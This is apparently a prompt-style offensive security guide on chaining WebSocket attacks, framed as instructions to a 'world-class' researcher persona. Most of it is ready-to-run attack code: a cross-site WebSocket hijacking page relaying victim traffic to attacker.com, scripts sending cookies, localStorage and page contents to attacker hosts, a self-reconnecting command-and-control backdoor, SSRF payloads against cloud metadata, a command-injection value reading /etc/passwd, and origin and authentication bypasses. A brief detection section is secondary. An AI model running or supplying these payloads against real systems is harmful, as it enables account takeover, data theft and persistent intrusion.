# WebSocket Security Chains: Real-Time Attack Exploitation

## Expert Role Definition

You are a world-class WebSocket security researcher specializing in real-time protocol exploitation across modern web applications. You understand WebSocket at the frame level including handshake negotiation, opcode encoding, masking, and fragmentation. You chain WebSocket flaws with SSRF, XSS, authentication bypass, and persistent access techniques. You approach every target with the mindset that real-time protocols are under-audited attack surfaces. You think in terms of message flows, event handlers, and state machines rather than traditional request-response cycles.

---

## Core Concepts

WebSocket (RFC 6455) provides full-duplex communication over a single TCP connection, initiated via an HTTP Upgrade handshake. Unlike HTTP stateless model, WebSockets maintain persistent connections that both client and server can push data through at any time. This creates a fundamentally different security surface.

The handshake begins with an HTTP GET containing Upgrade: websocket and Connection: Upgrade headers. The server responds with 101 Switching Protocols. After the handshake, both sides exchange frames with opcode, mask bit, payload length, and data payload. Each frame includes FIN bit, opcode (text=0x1, binary=0x2, close=0x8, ping=0x9, pong=0xA), mask bit, payload length (7-bit, 16-bit, or 64-bit encoding), masking key, and application data.

Key security properties include origin-based access control via the Origin header during handshake, masking requirement for client-to-server frames to prevent cache poisoning, and the complete absence of built-in authentication. Developers must implement authentication, authorization, and input validation themselves. Most WebSocket vulnerabilities stem from misconfigured origin validation, missing authentication on message handlers, and insufficient input sanitization on message payloads.

WebSocket connections bypass Content Security Policy for their data exchange. While CSP can restrict connect-src directive, many configurations overlook WebSocket URLs. This means XSS payloads delivered via WebSocket messages can execute even on CSP-protected pages if the WebSocket endpoint itself is trusted in the policy.

The attack surface spans three distinct phases: the handshake phase involving origin validation and authentication, the message phase involving injection, authorization checks, and data validation, and the connection lifecycle phase involving reconnection logic, session management, and heartbeat mechanisms. Understanding all three phases is critical for effective chaining.

---

## Pre-requisite Knowledge

Before attempting WebSocket security chains, you must understand WebSocket frame structure including FIN bit, opcode, mask, and payload length encoding. HTTP Upgrade handshake mechanics and Same-Origin Policy as it applies to WebSocket connections are essential. Familiarity with JavaScript WebSocket API (new WebSocket, onmessage, onopen, onerror, send), Socket.IO and Socket.IO client libraries, and STOMP over WebSocket for message queue applications is required.

You should understand CSRF tokens and how they apply or fail to apply to WebSocket handshakes. JSON Web Tokens used in WebSocket authentication and browser cookie handling with WebSocket connections must be understood. Knowledge of server-side WebSocket implementations including ws library, Socket.IO, SockJS, and SignalR with their default security configurations is necessary.

Understanding of real-time application architectures including pub/sub patterns, room-based messaging, event-driven architectures, and message queue backends will help you identify injection points and chaining opportunities. Experience with browser developer tools for inspecting WebSocket traffic and frame-level analysis is also valuable.

---

## Chain Architecture / Attack Flow Diagram

```
+-----------------------------------------------------------+
|                 WebSocket Attack Surface                  |
+-----------------------------------------------------------+
|  +----------+  HTTP GET + Upgrade  +----------+           |
|  | Attacker |-------------------->|  Server  |           |
|  |          |<--------------------|          |           |
|  +----------+  101 Switching Proto +----------+           |
|       | WS Frame: script injection payload                |
|       v                                                    |
|  +------------------------------------+                   |
|  | Phase 1: Handshake Exploitation    |                   |
|  |  - Origin validation bypass        |                   |
|  |  - Missing authentication          |                   |
|  |  - Header injection                |                   |
|  +------------------+-----------------+                   |
|                     v                                      |
|  +------------------------------------+                   |
|  | Phase 2: Message Exploitation      |                   |
|  |  - XSS injection in messages       |                   |
|  |  - SQL/NoSQL injection             |                   |
|  |  - Command injection               |                   |
|  |  - Privilege escalation            |                   |
|  +------------------+-----------------+                   |
|                     v                                      |
|  +------------------------------------+                   |
|  | Phase 3: Chain Execution           |                   |
|  |  - WS to XSS to Session hijack    |                   |
|  |  - WS to SSRF to Internal access  |                   |
|  |  - WS to Data exfiltration        |                   |
|  |  - WS to Persistent C2            |                   |
|  +------------------------------------+                   |
|                                                            |
|  CSWSH Attack Flow:                                        |
|  Attacker page --connect--> Victim WS endpoint            |
|  Victim WS --relay--> Attacker server                      |
|  Attacker server --commands--> Victim WS                   |
|                                                            |
|  WS to Internal Service Chain:                             |
|  Attacker --WS--> Server --proxy--> Internal API           |
+-----------------------------------------------------------+
```

---

## Step-by-Step Exploitation Methodology

### Step 1: WebSocket Endpoint Discovery

Discover all WebSocket endpoints by analyzing JavaScript source code, monitoring network traffic during normal application use, and checking for Socket.IO default paths. Use grep to search JavaScript bundles for WebSocket connection strings.

```bash
grep -rn 'new WebSocket|socket\.io|\.connect(|wss://|ws://' dist/ src/
curl -s http://target.com/socket.io/?EIO=4&transport=polling
katana -u http://target.com -jc -d 5 2>/dev/null | grep -iE 'ws|socket|realtime|live|stream'
```

### Step 2: Handshake Analysis and Origin Validation

Analyze the WebSocket handshake to determine origin validation, authentication requirements, and connection restrictions. Send handshake requests with various Origin headers to test validation.

```bash
curl -v -H 'Upgrade: websocket' -H 'Connection: Upgrade' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Sec-WebSocket-Version: 13' -H 'Origin: http://evil.com' \
  http://target.com/ws

for origin in 'http://evil.com' 'http://target.com.evil.com' 'null'; do
  curl -s -o /dev/null -w '%{http_code}' \
    -H 'Upgrade: websocket' -H 'Connection: Upgrade' \
    -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
    -H 'Sec-WebSocket-Version: 13' -H "Origin: $origin" \
    http://target.com/ws
  echo " - Origin: $origin"
done
```

### Step 3: Authentication Mechanism Testing

Determine how the WebSocket endpoint authenticates users. Common mechanisms include cookies sent with the handshake, tokens in query parameters, tokens in the first message after connection, and JWT tokens in custom headers.

```javascript
const ws1 = new WebSocket('ws://target.com/ws');  // No auth
const ws2 = new WebSocket('ws://target.com/ws?token=stolen_jwt');  // Query token
const ws3 = new WebSocket('ws://target.com/ws');  // Cookie-based auth
```

### Step 4: Cross-Site WebSocket Hijacking (CSWSH)

Craft an attacker page that connects to the victim WebSocket endpoint using the victim cookies. The browser automatically includes cookies if the endpoint is same-site or if cookies lack SameSite restriction.

```html
<html><body><script>
  const attackerWs = new WebSocket('wss://attacker.com/relay');
  const victimWs = new WebSocket('wss://target.com/ws');
  victimWs.onopen = function() {
    attackerWs.send(JSON.stringify({type: 'connected'}));
  };
  victimWs.onmessage = function(event) {
    attackerWs.send(JSON.stringify({type: 'stolen', data: event.data}));
  };
  attackerWs.onmessage = function(event) {
    const cmd = JSON.parse(event.data);
    victimWs.send(cmd.payload);
  };
</script></body></html>
```

### Step 5: Message Injection Attacks

Test for injection vulnerabilities in WebSocket message handlers by sending payloads in various formats. WebSocket messages often bypass WAF rules since they are not traditional HTTP requests.

```javascript
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({message: '<img src=x onerror=alert(1)>'}));
  ws.send(JSON.stringify({message: '<script>document.location="http://evil.com/?c="+document.cookie</script>'}));
  ws.send(JSON.stringify({query: '{"$gt":""}'}));
  ws.send(JSON.stringify({filename: 'test; cat /etc/passwd'}));
};
```

### Step 6: WebSocket to SSRF Chain

Use WebSocket client functionality on the server to make requests to internal services. If the server processes URLs from WebSocket messages, you can redirect requests to internal infrastructure.

```javascript
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({type: 'fetch_url', url: 'http://169.254.169.254/latest/meta-data/'}));
  ws.send(JSON.stringify({type: 'subscribe_webhook', url: 'http://internal-service:8080/admin'}));
};
```

### Step 7: Data Exfiltration via WebSocket

Establish a WebSocket connection as a covert channel for data exfiltration. WebSocket connections are often less monitored than HTTP connections and can bypass proxy logging.

```javascript
const ws = new WebSocket('wss://attacker.com/exfil');
ws.onopen = function() {
  ws.send(JSON.stringify({type: 'cookies', data: document.cookie}));
  ws.send(JSON.stringify({type: 'storage', data: JSON.stringify(localStorage)}));
  ws.send(JSON.stringify({type: 'page', data: document.documentElement.innerHTML}));
};
```

### Step 8: Persistent Backdoor via WebSocket

Establish a persistent WebSocket connection that serves as a command and control channel. Implement automatic reconnection to maintain access even if the connection drops.

```javascript
function connectC2() {
  const c2 = new WebSocket('wss://attacker.com/c2');
  c2.onmessage = function(event) {
    const cmd = JSON.parse(event.data);
    if (cmd.type === 'exec') {
      fetch('/api/exec', {method: 'POST', body: JSON.stringify({command: cmd.payload})})
        .then(r => r.json()).then(data => { c2.send(JSON.stringify({type: 'result', data: data})); });
    }
  };
  c2.onclose = function() { setTimeout(connectC2, 5000); };
}
connectC2();
```

---

## Tool Arsenal

### wscat and websocat

```bash
npm install -g wscat
wscat -c ws://target.com/ws
wscat -c 'ws://target.com/ws?token=jwt_token_here'

# Burp Suite WebSocket interception
# 1. Configure Burp proxy
# 2. Navigate to WebSocket endpoint in browser
# 3. Observe messages in Burp WebSocket tab
# 4. Right-click then Send to Repeater then Modify and resend
```

### Custom Python WebSocket Tester

```python
#!/usr/bin/env python3
import asyncio, websockets, json, sys

async def test_websocket(url, auth_token=None):
    headers = {}
    if auth_token: headers['Authorization'] = f'Bearer {auth_token}'
    try:
        async with websockets.connect(url, extra_headers=headers) as ws:
            print(f'[+] Connected to {url}')
            await ws.send(json.dumps({'message': '<img src=x onerror=alert(document.domain)>'}))
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f'[*] XSS Response: {response}')
    except Exception as e:
        print(f'[-] Error: {e}')

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'ws://localhost:8080/ws'
    asyncio.run(test_websocket(url))
```

### CSWSH Attack Server

```python
#!/usr/bin/env python3
import asyncio, websockets, json

connected_clients = {}

async def relay_server(websocket, path):
    client_id = path.strip('/')
    connected_clients[client_id] = websocket
    try:
        async for message in websocket:
            data = json.loads(message)
            if data.get('target') == 'victim':
                victim_ws = connected_clients.get('victim')
                if victim_ws: await victim_ws.send(json.dumps(data['payload']))
    except websockets.exceptions.ConnectionClosed: pass
    finally: del connected_clients[client_id]

async def main():
    server = await websockets.serve(relay_server, '0.0.0.0', 8765)
    await server.wait_closed()

if __name__ == '__main__': asyncio.run(main())
```

### WebSocket Scanner

```bash
#!/bin/bash
TARGET=$1
PATHS=("/ws" "/socket.io/" "/websocket" "/chat" "/events" "/live" "/stream" "/api/ws")
for path in "${PATHS[@]}"; do
  RESULT=$(curl -s -o /dev/null -w '%{http_code}' \
    -H 'Upgrade: websocket' -H 'Connection: Upgrade' \
    -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
    -H 'Sec-WebSocket-Version: 13' -H 'Origin: http://evil.com' "$TARGET$path")
  [ "$RESULT" == "101" ] && echo "[+] WebSocket found: $TARGET$path"
done
```

---

## Real-World Case Studies

### Case Study 1: Slack WebSocket Hijacking

In 2017, researchers discovered Slack WebSocket endpoint at wss://slack.com/socket/ did not properly validate the Origin header. An attacker could craft a page connecting to Slack WebSocket using victim session cookies. Through this connection the attacker could read real-time messages from all channels the victim had access to, send messages as the victim, and access files shared in channels. The attack chain was CSWSH to read channel messages, extract sensitive data from messages, use WebSocket connection to send phishing messages to other Slack users from the victim account, and achieve lateral movement within the organization. Slack patched the issue by implementing strict Origin validation and requiring additional authentication tokens in the WebSocket handshake.

### Case Study 2: Discord WebSocket Abuse

Discord WebSocket gateway at wss://gateway.discord.gg/ uses a token-based authentication system where the client sends an AUTH payload after connection. Researchers found that if a user token was compromised via XSS or other means, the WebSocket gateway allowed full account control. The WebSocket protocol was used to read all messages across servers, send messages, modify user settings, and access direct messages. The chaining opportunity was XSS in a Discord bot embed rendering, steal user token via localStorage, connect to WebSocket gateway with stolen token, and maintain persistent account access even after the XSS was patched because the WebSocket session remained active.

### Case Study 3: Socket.IO Authentication Bypass

A vulnerability was found in multiple applications using Socket.IO where the connect event handler performed authentication but the disconnect and custom event handlers did not re-validate the user session. An attacker could connect to the Socket.IO endpoint, authenticate successfully, then the server would cache the user permissions. If the user account was later deactivated or permissions changed, the Socket.IO connection would retain the old permissions. This allowed continued access to rooms and events that the user should no longer have access to.

### Case Study 4: Real-Time Chat Application SSRF

A real-time chat application used WebSocket connections where users could share links that the server would fetch to generate preview metadata. The server-side WebSocket handler fetched URLs provided by users without proper validation. An attacker could send a WebSocket message containing a URL pointing to internal services like http://169.254.169.254/latest/meta-data/. The server would fetch the URL and return the response content through the WebSocket, effectively creating a bidirectional SSRF tunnel through the WebSocket connection.

---

## Bypass Techniques and Evasion

### Origin Validation Bypass

```bash
curl -H 'Origin: http://target.com.evil.com' ws://target.com/ws
curl -H 'Origin: http://evil.com' ws://target.com/ws
curl -H 'Origin: null' ws://target.com/ws
curl -H 'Origin: http://TARGET.COM' ws://target.com/ws
curl -H 'Origin: http://target.com:80' ws://target.com/ws
```

### Authentication Bypass

```javascript
ws.send(JSON.stringify({token: ""}));
ws.send(JSON.stringify({token: "valid_token\x00"}));
const ws = new WebSocket('ws://target.com/ws?token=stolen');
```

### Rate Limiting Evasion

```javascript
function getRequestId() { return Math.random().toString(36).substr(2, 9); }
for (let i = 0; i < 100; i++) {
  const ws = new WebSocket(`ws://target.com/ws?id=${getRequestId()}`);
}
```

---

## Defensive Indicators / Detection

1. Handshake anomalies: Unusual Origin headers, missing Sec-WebSocket-Key, unexpected User-Agent strings
2. Message patterns: High-frequency messages, unusually large payloads, repetitive injection patterns
3. Connection patterns: Multiple rapid connections from same IP, connections during unusual hours
4. Data exfiltration: Large volumes of data sent from server to client, connections to external WebSocket servers

```
alert http any any -> any any (msg:"WS upgrade suspicious origin"; \
  http.method == "GET"; http.header:Upgrade contains "websocket"; \
  http.header:Origin contains "evil.com"; sid:1000001; rev:1;)
```

---

## Impact Assessment Framework

| Impact | Low (1-3) | Medium (4-6) | High (7-8) | Critical (9-10) |
|--------|-----------|--------------|------------|-----------------|
| **Confidentiality** | Limited msgs | Channel access | Cross-channel leak | Full account takeover |
| **Integrity** | Msg modification | Spoofed msgs | Privilege escalation | RCE |
| **Availability** | Connection drop | Service degradation | DoS | Persistent backdoor |
| **Scope** | Single user | Multiple users | Entire org | External systems |

CVSS 3.1 for CSWSH: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = 8.1 (High)

---

## Common Pitfalls and Anti-Patterns

1. Assuming CSP protects WebSocket: CSP connect-src may restrict WebSocket URLs but many configurations do not include it.
2. Relying solely on Origin validation: Origin headers can be spoofed in certain scenarios. Always implement additional authentication.
3. Trusting client-sent metadata: Never trust user IDs, roles, or session info in WebSocket messages. Validate everything server-side.
4. Ignoring reconnection logic: Attackers exploit reconnection mechanisms to brute-force authentication or maintain access after disconnection.
5. Missing input validation: WebSocket messages often bypass WAF inspection. Implement the same input validation as HTTP endpoints.
6. No re-authentication for sensitive ops: WebSocket connections established with initial authentication may not properly re-authenticate for sensitive operations.

---

## Advanced Variations

### WebSocket Tunneling Through HTTP

```javascript
const ws = new WebSocket('wss://target.com/ws', {
  headers: { 'Authorization': 'Bearer ' + stolenToken }
});
// SOCKS proxy over WebSocket, SSH tunnel over WebSocket
```

### WebSocket in Server-Side Rendering

```javascript
// SSR applications may render WebSocket messages in HTML
// If message content is not escaped, XSS occurs
// Test with: {"message": "<img src=x onerror=alert(1)>"}
```

### WebSocket Subprotocol Abuse

```javascript
const ws = new WebSocket('ws://target.com/ws', ['graphql-ws']);
const ws2 = new WebSocket('ws://target.com/ws', ['stomp']);
const ws3 = new WebSocket('ws://target.com/ws', ['vnc']);